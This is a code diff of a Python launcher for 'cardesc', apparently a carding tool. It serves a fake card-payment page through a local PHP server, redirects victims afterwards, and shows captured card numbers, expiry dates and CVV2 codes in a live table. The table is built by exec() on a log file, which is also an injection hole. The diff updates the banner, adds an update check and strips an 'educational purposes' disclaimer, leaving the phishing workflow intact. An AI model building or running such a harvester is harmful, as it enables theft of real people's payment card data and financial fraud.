@@ -1,120 +1,106 @@
 import os, sys, time
-import random
-from multiprocessing import Process
 from time import sleep
+from multiprocessing import Process
 from prettytable import PrettyTable
 import os
+import json
+import requests
 
 os.system('clear || cls')
-о = open('dist/log.log', 'w')
-о.close()
+with open("dist/log.log", "w") as dist:
+    pass
 
 class A:
     def __call__(self, count=10, sleep_time=0.5):
-        if used == "1":
-            os.system("cd dist && php -S localhost:"+str(ports))
-        else:
-            print("No number '"+used+"'")
-
+        os.system("cd dist && php -S localhost:"+str(ports))
 class B:
     def __call__(self, count=10, sleep_time=0.5):
         while True:
-            import os
             x = PrettyTable()
-            x.field_names = ['OS', 'Number', 'Date', 'CVV2']
-            g=0
+            x.field_names = ['OS', 'number', 'date', 'cvv2']
             exec(open('dist/log.log').read())
             print(x)
             time.sleep(1)
-            os.system("clear")
+            os.system("clear || cls")
 
-print("""\n __        __   __   ___  __   __  
-/  `  /\  |__) |  \ |__  /__` /  ` 
-\__, /~~\ |  \ |__/ |___ .__/ \__, 
-
-                v.3.0
-           :: t.me/oldnum ::
-  btc: 3LXDKcrjVXxpGhWXEnVMnndJP45nos2LBS          
-  eth: 0x7b6788a41F5379f49633a368FA902d47D318E4eC
-  payeer: P1061248421\n""")
-print("""
+with open('info/metadata.json') as data:
+    meta = json.load(data)
+logo=(f"""\n
+┌─┐┌─┐┬─┐┌┬┐┌─┐┌─┐┌─┐
+│  ├─┤├┬┘ ││├┤ └─┐│  
+└─┘┴ ┴┴└──┴┘└─┘└─┘└─┘
+[>] Version     : {meta['version']}
+ |--> btc: {meta['donate']['btc']}          
+ |--> eth: {meta['donate']['eth']}
+[>] Telegram    : {meta['telegram']}\n""")
+print(logo,"""
 [0] История BANK
 [1] CARD PAY
 [2] Helping
 """)
+def upd():
+    try:
+        rqst = requests.get(f"{meta['url']}", timeout=5)
+        meta_sc = rqst.status_code
+        if meta_sc == 200:
+            metadata = rqst.text
+            json_data = json.loads(metadata)
+            gh_version = json_data['version']
+            if (str(gh_version) > meta['version']):
+                print(logo)
+                print(f'\n[>]New Update Available : {gh_version}')
+                print(' |--> Please install     : https://github.com/oldnum/betarla')
+                print(f'[>]New Update Available : {gh_version}')
+                exit()
+            else:
+                pass
+    except Exception as exc:
+        pass
+upd()
 used = input("Введите номер: ")
-if used == "0":
+if (used=='0'):
     try:
         os.system('clear || cls')
-        print("""\n __        __   __   ___  __   __  
-/  `  /\  |__) |  \ |__  /__` /  ` 
-\__, /~~\ |  \ |__/ |___ .__/ \__, 
-
-                v.3.0
-           :: t.me/oldnum ::
-  btc: 3LXDKcrjVXxpGhWXEnVMnndJP45nos2LBS          
-  eth: 0x7b6788a41F5379f49633a368FA902d47D318E4eC
-  payeer: P1061248421\n""")
-        x = open('result.log', 'r')
-        print(x.read())
+        print(logo)
+        with open('result.log', 'r') as res:
+            print(res.read())
         exit()
     except:
         exit()
-elif used == '2':
+elif (used=='1'):
+    a=A()
+elif (used == '2'):
+    upd()
     os.system('clear || cls')
-    print("""\n __        __   __   ___  __   __  
-/  `  /\  |__) |  \ |__  /__` /  ` 
-\__, /~~\ |  \ |__/ |___ .__/ \__,
-
-                v.3.0         
-           ::t.me/oldnum::
-  btc: 3LXDKcrjVXxpGhWXEnVMnndJP45nos2LBS          
-  eth: 0x7b6788a41F5379f49633a368FA902d47D318E4eC
-  payeer: P1061248421\n""")
-    print("""#  cardesc  v.3.0
+    print(logo)
+    print(f"""#  cardesc  v.{meta['version']}
     apt update && apt upgrade
     git clone https://github.com/oldnum/cardesc
     cd cardesc
     pip3 install -r requirements.txt
 
 #  launch
-    python3 bank.py
-
-#  Ukraine
-Все, що тут написано, написано виключно для освітніх і дослідницьких цілей, а також для розуміння механізмів захисту від злому. Сподіваємося, що ця програма допоможе вам краще організувати свою безпеку в Інтернеті, попереджений є озброєним. Автор @oldnum жодним чином не рекомендує використовувати цю інформацію для злому :/
-Майте на увазі, ФБР стежить за вами :|
-
-# Russian
-Все написанное здесь написано исключительно в образовательных и исследовательских целях, а также для понимания механизмов защиты от взлома. Надеемся, что эта программа поможет вам лучше организовать свою безопасность в интернете, предупрежден — значит, вооружен. Автор @oldnum ни в коем случае не рекомендует использовать эту информацию для взлома :/
-Имейте в виду, ФБР следит за вами :|
-
-#  English
-Everything written here is written solely for educational and research purposes, as well as to understand the mechanisms of protection against hacking. We hope that this program will help you to better organize your security on the Internet, forewarned is forearmed. The author of @oldnum does not in any way recommend using this information for hacking :/
-Keep in mind, the FBI is watching you :|
-
-#  Donate:
-btc: 3LXDKcrjVXxpGhWXEnVMnndJP45nos2LBS
-eth: 0x7b6788a41F5379f49633a368FA902d47D318E4eC
-payeer: P1061248421
-""")
-    print("""Bye!""")
+    python3 bank.py\n""")
+    exit()
+else:
+    os.system("clear || cls")
+    print(logo)
     exit()
 
 ports = input("Порт: ")
 reloc = input("Редирект or (enter): ")
+
 if reloc != "":
     if used == "1":
-        f = open("dist/location.location", 'w')
-        f.write(reloc)
-        f.close()
+        with open("dist/location.location", 'w') as loca:
+            loca.write(reloc)
     else:
         pass
 else:
     if used ==  "1":
-        f = open("dist/location.location", 'w')
-        f.write("https://google.com")
-        f.close()
-if ports == "":
+        with open("dist/location.location", 'w') as loca:
+            loca.write("https://google.com")
+if (ports == "" or ports != int):
     ports=8080
 if __name__ == '__main__':
     a = A()
